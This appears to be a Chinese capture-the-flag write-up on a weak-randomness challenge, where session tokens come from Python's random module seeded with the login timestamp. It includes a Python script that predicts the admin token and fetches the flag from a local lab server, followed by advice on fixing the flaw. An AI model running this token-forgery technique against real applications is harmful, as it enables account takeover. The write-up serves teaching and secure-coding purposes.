# WriteUP - A04 Easy: 弱随机数/可预测会话Token

## 密码学原理

### 伪随机数生成器的种子问题

Python 的 `random` 模块使用的是**伪随机数生成器（PRNG, Pseudo-Random Number Generator）**。PRNG 的特点是：给定相同的种子（seed），生成的随机数序列完全相同。

```python
import random

random.seed(12345)
print(random.randint(0, 9))  # 总是输出相同的数字
```

当种子是可预测的（如使用当前时间戳 `time.time()`）时，攻击者就可以在知道种子的情况下，完全复现随机数序列，从而预测生成的 Token。

### 时间戳种子的脆弱性

```python
random.seed(int(time.time()))
token = ''.join([str(random.randint(0,9)) for _ in range(10)])
```

如果攻击者知道 Token 生成的大致时间（精确到秒），就可以：
1. 在该时间点运行相同的代码
2. 生成完全相同的 Token
3. 冒充合法用户

## 逐步利用过程

### 步骤 1：信息收集

访问首页，发现以下关键信息：
1. 页面提示：管理员在 Unix 时间戳 `1699123456`（整点时刻）登录
2. 查看页面源代码注释，发现 Token 生成算法：

```python
random.seed(int(time.time()))
token = ''.join([str(random.randint(0,9)) for _ in range(10)])
```

### 步骤 2：验证算法

注册一个普通账号并登录，系统返回：
- Token: `4827391056`
- 生成时间戳: `1699123456`

验证：使用相同时间戳作为种子，可以复现相同的 Token。

### 步骤 3：预测 Admin Token

管理员 Token 的生成时间是已知的整点时刻。使用该时间戳作为种子：

```python
import random

admin_login_time = 1699123456  # 从页面获取的时间戳
random.seed(admin_login_time)
admin_token = ''.join([str(random.randint(0,9)) for _ in range(10)])
print(admin_token)
```

### 步骤 4：获取 Flag

使用预测的 Token 访问：

```
GET /admin/flag?token=<预测的admin_token>
```

## Python 利用脚本

```python
import requests
import random

TARGET = "http://localhost:8080"

# 从首页获取管理员登录时间戳
resp = requests.get(TARGET)
# 解析页面中的时间戳，或直接从提示获取
admin_time = 1699123456  # 替换为实际获取的时间戳

# 生成 admin token
random.seed(admin_time)
admin_token = ''.join([str(random.randint(0, 9)) for _ in range(10)])
print(f"[+] Predicted admin token: {admin_token}")

# 获取 flag
flag_resp = requests.get(f"{TARGET}/admin/flag", params={"token": admin_token})
print(flag_resp.text)
```

## 修复建议

1. **使用加密安全的随机数生成器**
   ```python
   import secrets
   token = ''.join([str(secrets.randbelow(10)) for _ in range(10)])
   # 或更好的：使用 secrets.token_hex
   token = secrets.token_hex(16)
   ```

2. **不要使用时间戳作为种子**
   - 时间戳是可预测的
   - 即使使用 `os.urandom(16)` 作为种子也比时间戳安全

3. **增加 Token 的熵**
   - 10位数字只有 10^10 种组合
   - 使用至少 128 位熵（如 32 位十六进制字符串）

4. **使用成熟的会话管理机制**
   - Flask-Session
   - JWT with secure secret
   - 数据库-backed session tokens
